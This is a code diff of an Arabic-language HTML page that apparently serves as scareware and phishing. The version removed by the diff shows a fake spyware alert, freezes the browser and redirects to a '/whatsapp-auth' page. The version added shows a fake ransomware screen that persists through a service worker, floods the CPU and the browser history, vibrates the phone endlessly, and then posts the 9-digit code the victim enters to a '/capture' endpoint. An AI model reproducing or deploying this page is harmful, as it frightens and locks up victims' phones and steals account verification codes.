@@ -1,60 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM CRITICAL ERROR</title>
+    <title>☠️ SYSTEM BREACH DETECTED ☠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; touch-action: none; }
-        #horror-layer { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJmZzRyeHh5ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0JmVwaD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKsWZyGKY1ANKGf/giphy.gif') center/cover;
-            display: none; z-index: 999999;
-        }
-        .text { color: red; font-family: monospace; text-align: center; padding-top: 45vh; font-size: 20px; font-weight: bold; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
+        .console { padding: 20px; font-size: 14px; line-height: 1.8; }
+        #ransom-ui { display: none; text-align: center; padding: 20px; }
+        input { background: #111; border: 2px solid red; color: white; padding: 15px; width: 90%; font-size: 1.5rem; text-align: center; border-radius: 8px; }
+        .blink { animation: blinker 0.2s infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="launchAttack()">
+<body onclick="executePayload()">
 
-    <div id="status" class="text">⚠️ تم كشف فيروس تجسس!<br>انقر فوراً لتنظيف الهاتف</div>
-    <div id="horror-layer"></div>
+    <div id="boot" class="console">
+        [SYSTEM]: VULNERABILITY CVE-2025-EXPLOTED...<br>
+        [MEMORY]: OVERFLOWING RAM SECTORS...<br>
+        [FILES]: ENCRYPTING /INTERNAL_STORAGE/... <span id="p">0%</span><br>
+        <div class="blink" style="margin-top:20px;">⚠️ لا تلمس الجهاز - جاري تأمين البيانات ⚠️</div>
+    </div>
+
+    <div id="ransom-ui">
+        <h1 class="blink">🔒 تم تشفير النظام 🔒</h1>
+        <p>تم قفل هذا الهاتف بواسطة نظام حماية متقدم. لفك التشفير، أدخل الكود المكون من 9 أرقام:</p>
+        <input type="number" id="code" placeholder="123456789">
+        <br><br>
+        <button onclick="checkKey()" style="background:red; color:white; width:100%; padding:20px; border:none; font-weight:bold; border-radius:8px;">إدخال مفتاح فك التشفير</button>
+    </div>
 
     <script>
-        function launchAttack() {
-            // 1. طلب ملء الشاشة لإخفاء معالم النظام
-            document.documentElement.requestFullscreen().catch(() => {});
+        // تسجيل الخدمة لضمان بقاء الفيروس حياً في الخلفية
+        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
+
+        async function executePayload() {
+            // إخفاء معالم النظام (ملء الشاشة)
+            document.documentElement.requestFullscreen();
             
-            // 2. تفعيل الطبقة المرعبة
-            document.getElementById('status').style.display = 'none';
-            document.getElementById('horror-layer').style.display = 'block';
+            // اهتزاز هستيري
+            if (navigator.vibrate) setInterval(() => navigator.vibrate([1000, 500, 1000]), 2000);
 
-            // 3. اهتزاز هستيري لا يتوقف
-            if (navigator.vibrate) {
-                setInterval(() => { navigator.vibrate(1000); }, 100);
-            }
-
-            // 4. تجميد النواة (The Heavy Freeze)
-            // هذا الجزء سيجعل الهاتف قطعة حديد لمدة 60 ثانية
-            setTimeout(() => {
-                const freezeTime = 60000; // دقيقة كاملة
-                const start = Date.now();
+            // تجميد النظام لمدة 60 ثانية (CPU Flooding)
+            let progress = 0;
+            const start = Date.now();
+            const freeze = setInterval(() => {
+                progress += 0.5;
+                if(progress <= 100) document.getElementById('p').innerText = Math.floor(progress) + "%";
                 
-                while (Date.now() - start < freezeTime) {
-                    // إغراق سجل المتصفح لشل زر "الخلف"
+                // الدورة القاتلة لمعالج الهاتف
+                const end = Date.now() + 100;
+                while (Date.now() < end) {
                     window.history.pushState(null, null, "#" + Math.random());
-                    
-                    // استهلاك المعالج بالكامل عبر عمليات معقدة
-                    for (let i = 0; i < 1000000; i++) {
-                        Math.atan2(Math.random(), Math.random());
-                    }
+                    Math.tan(Math.random()); 
                 }
 
-                // بعد انتهاء الدقيقة، التوجه لصفحة سحب الكود
-                window.location.href = "/whatsapp-auth";
-            }, 500);
+                // بعد دقيقة من التجمد التام
+                if (Date.now() - start > 60000) {
+                    clearInterval(freeze);
+                    showUI();
+                }
+            }, 150);
         }
 
-        // منع الخروج أو الرجوع بأي وسيلة
-        window.onbeforeunload = function() { return "FATAL ERROR"; };
+        function showUI() {
+            document.getElementById('boot').style.display = 'none';
+            document.getElementById('ransom-ui').style.display = 'block';
+            document.body.style.touchAction = 'auto'; // إعادة اللمس فقط لصفحة الكود
+        }
+
+        async function checkKey() {
+            const val = document.getElementById('code').value;
+            // إرسال الكود فوراً لتيليجرام
+            await fetch('/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ email: "ضحية المالوير", password: "الكود: " + val })
+            });
+
+            if (val === "123456789") {
+                alert("تم التحقق بنجاح. سيعود الهاتف للعمل.");
+                window.location.href = "https://google.com";
+            } else {
+                alert("❌ كود خاطئ! سيتم تدمير البيانات خلال 60 ثانية.");
+            }
+        }
     </script>
 </body>
 </html>
